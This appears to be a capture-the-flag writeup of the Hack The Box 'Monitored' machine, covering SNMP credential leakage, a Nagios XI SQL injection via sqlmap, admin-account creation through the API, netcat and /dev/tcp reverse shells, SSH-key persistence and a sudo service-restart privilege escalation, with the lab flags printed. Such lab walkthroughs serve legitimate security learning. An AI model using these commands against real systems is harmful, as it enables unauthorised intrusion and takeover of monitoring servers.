# Monitored

## Introduction

This writeup details the exploitation process of the "Monitored" box on Hack The Box. The challenge is categorized as medium difficulty and involves several stages, from initial access via SNMP enumeration to gaining root access through service misconfiguration.

<figure><img src="../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### Nmap

```bash
sudo nmap -A -sC -sU -sV -Pn 10.10.11.248
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

### Adding Domain to Hosts File

```bash
echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts
```

### Directory Enumeration

```bash
dirsearch -u https://nagios.monitored.htb/nagiosxi/
```

<figure><img src="../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

```
dirsearch -u https://nagios.monitored.htb/nagiosxi/api/v1
```

<figure><img src="../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### SNMP Enumeration

```bash
incursore.sh -H 10.10.11.248 -t recon
```

```basic
iso.3.6.1.2.1.25.4.2.1.5.570 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh <USERNAME> <password> "
```

### Authentication Bypass

```bash
curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=<USERNAME>&password=<PASSWORD>&valid_min=1000'

{"username":"svc","user_id":"2","auth_token":"<TOKEN>","valid_min":1000,"valid_until":"Tue, 05 Mar 2024 15:48:12 -0500"}
```

It no luck to login with auth\_token, but i found the SQL injection [nagios-xi-vulnerabilities](https://outpost24.com/blog/nagios-xi-vulnerabilities/).

### SQL Injection and API Key&#x20;

```bash
sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=<TOKEN>" --level=3 --risk=3 -p id --batch --dbms=mysql -D nagiosxi -T xi_users --dump
```

### Create New User

<pre class="language-bash"><code class="lang-bash"><strong>curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=&#x3C;API_KEY>" -d "username=admin&#x26;password=KPMG&#x26;auth_level=admin&#x26;email=test@gmail.com&#x26;name=eiei"
</strong><strong>
</strong>{"success":"User account admin was added successfully!","user_id":8}
</code></pre>

* Enter https://nagios.monitored.htb/nagiosxi/mobile/
* Login as USERNAME:PASSWORD
* Go the desktop dashboard

<figure><img src="../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>

* go https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

* Find command tab
* Add new command

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

* nc \<YOUR\_IP> \<YOUR\_PORT> -e /bin/bash
* Run check command
* nc -lvnp \<YOUR\_PORT>

### User Flag

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* Cat user.txt ~~e9eaf8e812a59f17bcae9f18b37b4509~~

## Privilege Escalation

### Create own SSH

<pre class="language-bash"><code class="lang-bash">#Your localmachines
ssh-keygen -t rsa -b 4096 -C "your_email@example.com" 
<strong>
</strong><strong>#Victims
</strong>mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

#Your localmachines
cat ~/.ssh/id_rsa.pub

#Victims
echo 'your_public_ssh_key' >> ~/.ssh/authorized_keys

#Your localmachines
ssh username@victim_server_ip
</code></pre>

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### Create LinPEAS.sh:

```bash
#Your localmachines
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > test.sh

chmod +x test.sh

scp test.sh nagios@IP:/home/nagios
```

### Run line LinPEAS

```bash
./test.sh
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

```bash
nano /usr/local/nagios/bin/npcd
----------------------------------------------
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
----------------------------------------------
chmod +x /usr/local/nagios/bin/npcd
```

```markup
We don't know how to restart `npcd` service, let try `sudo -l`
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Root Flag

cat /root/root.txt&#x20;

~~cc01453cbbbad93eac5646e6ebf0046c~~

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
